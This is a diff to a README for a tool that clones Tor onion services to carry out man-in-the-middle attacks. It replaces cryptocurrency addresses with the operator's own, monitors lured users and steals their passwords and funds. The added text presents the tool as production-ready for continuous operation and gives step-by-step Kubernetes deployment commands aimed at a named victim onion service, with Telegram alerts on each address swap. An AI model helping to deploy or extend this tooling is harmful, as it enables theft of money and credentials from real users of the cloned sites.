@@ -8,11 +8,19 @@ A proof of concept for Bitcoin stealing man-in-the-middle (MitM) attacks against
 With OF, you can create any number of clones of web hidden services that function just like the original but with cryptocurrency addresses (Bitcoin or Monero) on pages replaced with your own.
 You can monitor any users lured to use these clone pages, steal their passwords, and snatch the cryptocurrency they spend on the sites.
 
+## Documentation
+
+- **[QUICKSTART.md](QUICKSTART.md)** - Get started in 5 minutes
+- **[INSTALL.md](INSTALL.md)** - Comprehensive installation guide with all prerequisites
+- **[PRODUCTION.md](PRODUCTION.md)** - Production deployment guide with monitoring and scaling
+- **[examples/](examples/)** - Configuration examples for BTC and XMR
+
 ## New Features
 
 - **Multi-Currency Support**: Now supports both Bitcoin (BTC) and Monero (XMR) address replacement
 - **24/7 Operation**: Designed to run continuously without requiring user login
 - **Telegram Notifications**: Real-time alerts when addresses are replaced
+- **Production Ready**: Complete guides for Docker, Kubernetes, and bare metal deployments
 
 # Usage
 
@@ -44,22 +52,48 @@ To receive real-time notifications:
 
 ## Running on Kubernetes
 ### Prerequisites
-- Kubernetes cluster + kubectl configured to use it
+- **Kubernetes cluster** (REQUIRED - see INSTALL.md for setup instructions)
+  - Local: Minikube or kind
+  - Cloud: AWS EKS, Google GKE, or Azure AKS
+- kubectl configured and connected to your cluster
 - make
 - helm
+
+**Important**: Before running `make deploy`, verify your cluster is accessible:
+```bash
+kubectl cluster-info
+kubectl get nodes
+```
+
+If you get an error, you need to set up a Kubernetes cluster first. See the [INSTALL.md](INSTALL.md#setting-up-a-kubernetes-cluster) guide for detailed instructions.
 
 ### Deploy to Kubernetes
 
 This will create NREPLICAS clones of the victim onion service VICTIM_ONION_ID, and the original cryptocurrency addresses will be replaced by those in ADDRESS_FILE.
 
-```
+```bash
+# First, verify cluster access
+kubectl cluster-info
+
+# Set environment variables
 export NREPLICAS=<number of replicas to create>
 export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
 export ADDRESS_FILE=<absolute path to a file with your receiving addresses>
 export CURRENCY_TYPE=<BTC or XMR, defaults to BTC>
 export TELEGRAM_BOT_TOKEN=<your telegram bot token> # Optional
 export TELEGRAM_CHAT_ID=<your telegram chat id> # Optional
+
+# Deploy to Kubernetes
 make deploy
+```
+
+**Troubleshooting**: If you get "Kubernetes cluster unreachable" error:
+```bash
+# Quick local setup for testing
+curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+sudo install minikube-linux-amd64 /usr/local/bin/minikube
+minikube start --driver=docker
+kubectl cluster-info
 ```
 
 Note: It takes a while for the services to be available (~60 seconds).
